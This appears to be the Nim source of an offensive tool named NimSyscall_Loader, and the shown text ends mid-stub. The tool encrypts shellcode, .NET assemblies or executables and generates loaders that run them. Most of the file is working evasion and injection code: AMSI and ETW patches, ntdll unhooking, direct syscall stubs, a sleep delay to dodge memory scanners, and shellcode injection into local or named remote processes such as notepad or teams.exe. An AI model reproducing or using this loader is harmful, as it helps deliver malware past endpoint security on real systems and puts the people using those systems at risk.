#[

    Author: Fabian Mosch, Twitter: @ShitSecure
    Inspiration from: https://github.com/icyguider/nimcrypt/blob/main/nimcrypt.nim
]#

import nimcrypto
import nimcrypto/sysrand
import base64
import strformat
import strutils
import os
import docopt
from system import io

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc toString(bytes: seq[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

let banner = """
    _   ___          _____                       ____     __                    __         
   / | / (_)___ ___ / ___/__  ________________ _/ / /    / /   ____  ____ _____/ /__  _____
  /  |/ / / __ `__ \\__ \/ / / / ___/ ___/ __ `/ / /    / /   / __ \/ __ `/ __  / _ \/ ___/
 / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
/_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                       /____/                   /_____/      --> @ShitSecure                                             
"""

echo banner

#Handle arguments

let helpmenu = """
NimSyscall_Loader v 1.0

Usage:
  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep --shellcode --COMVARETW --remoteinject --unhook --reflective --obfuscate --hide --noArgs --pe]
  NimSyscall_Loader (-h | --help)
  NimSyscall_Loader --version

Options:
  -h --help     Show this screen.
  --version     Show version.
  --file filename  File to encrypt.
  --key key     Key to encrypt with
  --output filename    Filename for encrypted exe
  --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
  --noETW    Don't use ETW Patch
  --noAMSI    Don't patch AMSI
  --csharp    Encrypt a C# Assembly to load it on runtime
  --noArgs    Don't provide any arguments to the assembly (some can only run without args)
  --shellcode    Encrypt shellcode to load it on runtime
  --sleep    Sleep 20 secconds before decryption to evade in memory scanners
  --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
  --remoteprocess procname    Injects into the specified remote process name, e.g. teams.exe. The loader searches for the first process with that name
                     Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
  --unhook    Unhook ntdll.dll before doing anything else for the current process
  --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
  --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation (not possible in combination with --reflective)
  --hide    Compile with --app:gui flag, so that the console won't pop up
  --pe    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
"""

if (paramCount() == 0):
    echo helpmenu
    quit(0)
if (paramStr(1) == "-h"):
    echo helpmenu
    quit(0)

var 
    filename: string = ""
    outfile: string = "Loader.exe"
    envkey: string = "TARGETDOMAIN"
    processname: string = ""
    csharp: bool = false
    AMSI: bool = true
    ETW: bool = true
    COMVARETW: bool = false
    shellcode: bool = true
    localinject: bool = true
    unhook: bool = false
    denim: bool = false
    reflective: bool = false
    hide: bool = false
    noArgs: bool = false
    pe: bool = false
    sleeptime: int = 0
    remoteprocess: string = ""
    remoteprocessesstring: string
    remoteprocesses: seq[string]

let args = docopt(helpmenu, version = "NimSyscall_Loader 1.0")

if args["--file"]:
  let fname = args["--file"]
  filename = fmt"{fname}"
  echo filename

if args["--key"]:
  let keyname = args["--key"]
  envkey = fmt"{keyname}"

if args["--output"]:
  let outname = args["--output"]
  outfile = fmt"{outname}"

if args["--remoteprocess"]:
  let remoteprocessesstring = args["--remoteprocess"]
  processname = fmt"{remoteprocessesstring}"
  remoteprocesses = processname.split(',') 

if args["--csharp"]:
  csharp = true
  shellcode = false

if args["--noAMSI"]:
  AMSI = false

if args["--noETW"]:
  ETW = false

if args["--COMVARETW"]:
  COMVARETW = true

if args["--shellcode"]:
  shellcode = true

if args["--unhook"]:
  unhook = true

if args["--sleep"]:
  sleeptime = 20000

if args["--remoteinject"]:
  localinject = false

if args["--reflective"]:
  reflective = true

if args["--obfuscate"]:
  denim = true

if args["--hide"]:
  hide = true

if args["--noArgs"]:
  noArgs = true

if args["--pe"]:
  pe = true

var blob: string
#Read file and if PE convert to shellcode before
if (shellcode):
    if (pe):
        var exist: bool = existsFile("donut.exe")
        if (exist):
            discard os.execShellCmd(fmt".\donut.exe -f {filename} -o tmpshellcode.bin")
            blob = readFile("tmpshellcode.bin")
        else:
            echo fmt"'.\Donut.exe' not found. You need to download put it into the CWD: https://github.com/TheWover/donut"
    else:
        blob = readFile(filename)
else:
    blob = readFile(filename)

var
    data: seq[byte] = toByteSeq(blob)

    ectx: CTR[aes256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    plaintext = newSeq[byte](len(data))
    enctext = newSeq[byte](len(data))

# Create Random IV
discard randomBytes(addr iv[0], 16)

# We do not need to pad data, `CTR` mode works byte by byte.
copyMem(addr plaintext[0], addr data[0], len(data))

# Expand key to 32 bytes using SHA256 as the KDF
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

ectx.init(key, iv)
ectx.encrypt(plaintext, enctext)
ectx.clear()


#let encoded = encode(enctext)
echo "Writing encrypted blob to disk: "

var nameoffile: string = "enc.blob"
var content: string = cast[string](enctext)
writeFile("enc.blob", content)


let encodedIV = encode(iv)
let encodedenvkey = encode(envkey)

let RemoteProcImportStub = """
import osproc
"""

let GetSyscallStub = """
type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
  KNORMAL_ROUTINE* {.pure.} = object
    NormalContext*: PVOID
    SystemArgument1*: PVOID
    SystemArgument2*: PVOID
  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE

var 
    SYSCALL_STUB_SIZE: int = 23;

proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
    return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)

proc GetSyscallStub(functionName: LPCSTR, syscallStub: LPVOID): BOOL =
    var
        file: HANDLE
        fileSize: DWORD
        bytesRead: DWORD
        fileData: LPVOID
        ntdllString: LPCSTR = "C:\\windows\\system32\\ntdll.dll"
        nullHandle: HANDLE
    file = CreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
    fileSize = GetFileSize(file, nil)
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize)
    ReadFile(file, fileData, fileSize, addr bytesRead, nil)

    var
        dosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](fileData)
        imageNTHeaders: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](fileData) + dosHeader.e_lfanew)
        exportDirRVA: DWORD = imageNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
        section: PIMAGE_SECTION_HEADER = IMAGE_FIRST_SECTION(imageNTHeaders)
        textSection: PIMAGE_SECTION_HEADER = section
        rdataSection: PIMAGE_SECTION_HEADER = section

    let low: uint16 = 0

    for Section in low ..< imageNTHeaders.FileHeader.NumberOfSections:
        var ntdllSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(imageNTHeaders)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        if ".rdata" in toString(ntdllSectionHeader.Name):
            rdataSection = ntdllSectionHeader
        
    var exportDirectory: PIMAGE_EXPORT_DIRECTORY = cast[PIMAGE_EXPORT_DIRECTORY](RVAtoRawOffset(cast[DWORD_PTR](fileData) + exportDirRVA, rdataSection))

    var addressOfNames: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfNames), rdataSection))
    var addressOfFunctions: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfFunctions), rdataSection))
    var stubFound: BOOL = 0
    var oldProtection: DWORD = 0
    let low2: int = 0
    for low2 in 0 ..< exportDirectory.NumberOfNames:
        var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2], rdataSection))
        var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 1], textSection))
        var functionNameResolved: LPCSTR = cast[LPCSTR](functionNameVA)
        if (functionNameResolved == functionName):
            #echo functionNameResolved
            copyMem(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
            stubFound = 1
            #echo "Found Syscall STUB!"
    return stubFound

"""

let AMSIETWDelegates = """
# Unmanaged NTDLL Declarations
type myNtProtectVM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
type myNtWriteVM = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

"""

let LocalInjectDelegates = """
# Unmanaged NTDLL Declarations
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

"""

let RemoteInjectDelegates = """
# Unmanaged NTDLL Declarations
type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}

"""

let UnhookStub = """

from winim import MODULEINFO, GetModuleInformation

proc ntdllunhook(): bool =
  let low: uint16 = 0
  var 
      processH = GetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA("ntdll.dll")
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo fmt"Could not create file mapping object ({GetLastError()})."
    return false
  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo fmt"Could not map view of file ({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection : DWORD = 0
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
            echo fmt"Failed calling VirtualProtect ({GetLastError()})."
            return false
          copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
            echo fmt"Failed resetting memory back to it's orignal protections ({GetLastError()})."
            return false  
  CloseHandle(processH)
  CloseHandle(ntdllFile)
  CloseHandle(ntdllMapping)
  FreeLibrary(ntdllModule)
  return true


when isMainModule:
  var result = ntdllunhook()
  echo fmt"[*] unhook Ntdll: {bool(result)}"

"""


let AMSIStub = """
proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled
    
    var hProcess: HANDLE
    hProcess = GetCurrentProcess()

    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    var syscallStub_NtProtect: LPVOID
    syscallStub_NtProtect = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0

    # Define NtProtectVirtualMemory
    var NtProtectVirtualMemory: myNtProtectVM = cast[myNtProtectVM](cast[LPVOID](syscallStub_NtProtect))
    VirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVM](cast[LPVOID](syscallStub_NtWrite))
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    var success: BOOL
    var protectAddress = cs
    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
    var shellcodeLength = cast[SIZE_T](patch.len)
    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr shellcodeLength,0x40,addr t) 
    if (success != 0):
        echo "NtProtectVirtualMemory failed"
        return disabled
    echo "[*] Applying Syscall AMSI patch"
    var outLength: SIZE_T
    
    success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
    
    if (success != 0):
        echo "NtWriteVirtualMemory failed"
        return disabled
        # fails for some reason
        #copyMem(addr cs, unsafeAddr patch, patch.len)
    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr shellcodeLength,cast[ULONG](t),addr op)
    if (success != 0):
        echo "NtWriteVirtualMemory failed"
        return disabled
    else:
        echo "[*] OldProtect set back"
        disabled = true
    
    success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
    # Fails for some reason
    #success = NtProtectVirtualMemory(hProcess,addr syscallStub_NtProtect,addr shellcodeLength,PAGE_READWRITE,addr op)
    echo "[*] Restored Stub protections: " & $success

    return disabled

when isMainModule:
    success = PatchAmsi()
    echo fmt"[*] AMSI disabled: {bool(success)}"
"""

let ETWCOMVARStub = """
proc BlockETW(): bool =
    # Disable ETW via https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/
    var cometw: string = "COMPlus_ETWEnabled"
    var setnull: string = "0"
    putenv(cometw, setnull)
    return true

when isMainModule:
    var success = BlockETW()
    echo fmt"[*] ETW blocked by COMPLUS_ETWEnabled variable: {bool(success)}"
"""

let ETWPatchStub = """

proc Patchntdll(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    var hProcess: HANDLE
    hProcess = GetCurrentProcess()

    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    var syscallStub_NtProtect: LPVOID
    syscallStub_NtProtect = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0

    # Define NtProtectVirtualMemory
    var NtProtectVirtualMemory: myNtProtectVM = cast[myNtProtectVM](cast[LPVOID](syscallStub_NtProtect))
    VirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVM](cast[LPVOID](syscallStub_NtWrite))
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    var success: BOOL
    var protectAddress = cs
    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
    var shellcodeLength = cast[SIZE_T](patch.len)
    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr shellcodeLength,0x40,addr t) 
    if (success != 0):
        echo "NtProtectVirtualMemory failed"
        return disabled
    echo "[*] Applying Syscall ETW patch"
    var outLength: SIZE_T
    
    success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
    
    if (success != 0):
        echo "NtWriteVirtualMemory failed"
        return disabled
        # fails for some reason
        #copyMem(addr cs, unsafeAddr patch, patch.len)
    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr shellcodeLength,t,addr op)
    if (success != 0):
        echo "NtWriteVirtualMemory failed"
        return disabled
    else:
        echo "[*] OldProtect set back"
        disabled = true
    
    success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)

    return disabled

when isMainModule:
    success = Patchntdll()
    echo fmt"[*] ETW blocked by patch: {bool(success)}"
"""

let ShellcodelocalStub = """
from winlean import getCurrentProcess

proc pwndem[byte](shellcode: openarray[byte]): void =

    let tProcess = GetCurrentProcessId()
    var pHandle: HANDLE = getCurrentProcess()

    let syscallStub_NtAlloc = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    
    var oldProtection: DWORD = 0
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var tHandle: HANDLE
    var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)
    var ds: LPVOID
    
    cid.UniqueProcess = tProcess

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);


    var status: NTSTATUS
    var success: BOOL

    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
  
    cid.UniqueProcess = tProcess

    status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE);

    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(pHandle,ds,unsafeAddr shellcode,sc_size-1,addr bytesWritten);

    echo "[*] WriteProcessMemory: ", status
    echo "    \\-- bytes written: ", bytesWritten
    echo ""
    
    let f = cast[proc(){.nimcall.}](ds)
    f()

    status = NtClose(pHandle)


when isMainModule:
     pwndem(dectext)

"""

let ShellcoderemoteinjectStub_notepad = """
proc injectCreateRemoteThread(shellcode: openarray[byte]): void =

    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend() # That's handy!
    defer: tProcess.close()

    echo "[*] Target Process: ", tProcess.processID

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)

    cid.UniqueProcess = tProcess.processID

"""

let ShellcoderemoteinjectStub_customproc = fmt"""

from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA

proc FindPidByName * (processName : string):DWORD =
    try:
        var 
            entry : PROCESSENTRY32A
            snapshot : HANDLE
            pid : DWORD = 0
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot != INVALID_HANDLE_VALUE:
            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
            if Process32FirstA(snapshot,addr entry):
                while Process32NextA(snapshot,addr entry):
                    pid = entry.th32ProcessID
                    if ($(entry.szExeFile).join()).contains(processName):
                        result = pid
    except: 
        echo "Process ID not found"

proc injectCreateRemoteThread(shellcode: openarray[byte]): void =

    var processID: DWORD
    var remoteprocesses: seq[string] = {remoteprocesses}
    var found: bool = false
    for m in remoteprocesses:
        if found == true: continue
        echo "Checking: " & $m
        processID = FindPidByName(m)
        if (processID):
            found = true

    echo "[*] Target Process: ", processID

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)

    cid.UniqueProcess = processID

"""

let ShellcoderemoteinjectStub = """
    
    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

    let syscallStub_NtOpenP = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    
    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)


    var oldProtection: DWORD = 0

    # define NtOpenProcess
    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP));
    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtCreateThreadEx
    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate));
    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    var status: NTSTATUS
    var success: BOOL

    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP));
    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate));

    
    status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )


    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE);

    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr shellcode, 
        sc_size-1, 
        addr bytesWritten);

    echo "[*] NtWriteVirtualMemory: ", status
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        ds, 
        NULL, FALSE, 0, 0, 0, NULL);

    status = NtClose(tHandle)
    status = NtClose(pHandle)

    # This doesn't work so far for some reason
    #success = VirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection);
    #echo "set back old protect"
    echo success
   

when isMainModule:
     injectCreateRemoteThread(dectext)

"""

let AssemblyImports = """
import winim/clr except `[]`
"""

let LoadAssemblyStub = """

var assembly = load(dectext)

var cmd: seq[string]
var i = 1
while i <= paramCount():
    cmd.add(paramStr(i))
    inc(i)

"""

let LoadAssemblyStubArgs = """
var arr = toCLRVariant(cmd, VT_BSTR)
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
"""

let LoadAssemblyStubNoArgs = """

var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

"""

let Winimleanstub = """
import winim/lean
"""

let Cryptstub1 = """
import winim/lean
#from dynlib import LibHandle, loadLib
# something seams to be still missing here
